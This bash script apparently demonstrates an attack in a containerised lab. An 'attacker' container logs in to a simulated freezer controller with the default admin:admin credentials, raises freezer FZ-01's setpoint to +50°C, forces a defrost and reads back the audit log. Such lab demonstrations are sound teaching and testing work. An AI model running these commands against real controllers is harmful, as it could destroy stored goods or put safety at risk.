#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
COMPOSE=(docker compose -f "$ROOT/deploy/compose.yml")

echo "== Default credentials: set FZ-01 to +50°C =="
"${COMPOSE[@]}" exec -T attacker curl -sS -u admin:admin \
  -X POST -H 'content-type: application/json' \
  -d '{"target_c":50}' \
  http://legacy-edge/api/freezers/FZ-01/target |
  jq '{id, target_c, current_c, mode, alarm}'

echo
echo "== Default credentials: force a defrost =="
"${COMPOSE[@]}" exec -T attacker curl -sS -u admin:admin \
  -X POST http://legacy-edge/api/freezers/FZ-01/defrost |
  jq '{id, target_c, current_c, mode, alarm}'

echo
echo "== The controller's own audit log =="
"${COMPOSE[@]}" exec -T attacker curl -sS http://legacy-edge/api/audit |
  jq '.entries[0:4]'

echo
echo "The admin UI should now show FZ-01 climbing out of its safe band."
